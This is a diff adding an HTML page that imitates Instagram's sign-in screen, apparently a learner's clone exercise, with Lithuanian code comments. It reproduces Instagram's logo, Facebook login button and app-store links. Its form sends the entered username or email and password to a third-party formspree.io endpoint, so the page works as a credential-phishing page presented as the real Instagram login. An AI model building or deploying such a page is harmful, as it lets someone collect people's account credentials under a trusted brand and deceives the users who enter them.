@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <script src="https://kit.fontawesome.com/fcb70e3dea.js" crossorigin="anonymous"></script>
+  <link rel="stylesheet" href="reset.css" />
+  <link rel="stylesheet" href="style.css" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Instagram sign in form</title>
+</head>
+
+<body>
+    <main class="container">
+      <!-- Pirmas blokas su logotipu-->
+      <div class="form">
+        <div>
+          <img src="./img/Instagram_logo.svg.png" alt="instagram-logo" class="logo" />
+        </div>
+        <!-- Formos suskurimas  -->
+        <form action="https://formspree.io/f/mvoyddbl" method="POST" class="form-field">
+          <div class="input-fields">
+            <input id="username" type="text" name="ph-number, username, email"
+              placeholder="Phone number, username, or email" class="first-inputs" />
+              <i class="far fa-eye" id="togglePassword" onclick="myFunction()"></i>
+            <input id="pass" type="password" name="password" placeholder="Password" class="first-inputs" />
+            <button type="submit" class="btn">Log in</button>
+          </div>
+          <div class="lines">
+            <!-- <div class="line-one"></div> -->
+            <div>
+              <p class="orline">OR</p>
+            </div>
+            <!-- <div class="line-two"></div> -->
+          </div>
+          <div class="fcb-login">
+            <button class="btn-log">
+              <span class="fa-brands fa-square-facebook"></span>
+              <span class="text-login">Log in with Facebook</span>
+            </button>
+            <a href="" class="link">Forgot password?</a>
+          </div>
+        </form>
+      </div>
+      <!-- Antras blokas formos -->
+      <div class="row-clm">
+        <p class="text-msg">
+          Don't have an account?<span><a href="" role="link" class="a-sign">Sign up</a></span>
+        </p>
+      </div>
+      <!-- App blokas -->
+      <div class="row-clm-two">
+          <p class="text-msg-last">Get the app.</p>
+          <div class="app-logo">
+            <a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26ig_mid%3D5B22E870-2C53-4FBB-978A-811D080F1C91%26utm_content%3Dlo%26utm_medium%3Dbadge"
+            >
+              <img src="./img/google-play.png" alt="Get it on Google Play" class="small-logo"/>
+            </a>
+            <a href="ms-windows-store://pdp/?productid=9nblggh5l9xt&referrer=appbadge&source=www.instagram.com&mode=mini&pos=1913%2C0%2C1457%2C1177"
+            >
+              <img src="./img/microsoft.png" alt="Get it on Microsoft" class="small-logo"/>
+            </a>
+          </div>
+      </div>
+    </main>
+    <!-- Kodas pass rodymui -->
+    <script>
+      function myFunction() {
+        let x = document.getElementById("pass");
+        if (x.type === "password") {
+          x.type = "text";
+        } else {
+          x.type = "password";
+        }
+      }
+      </script>
+  </body>
+
+</html>
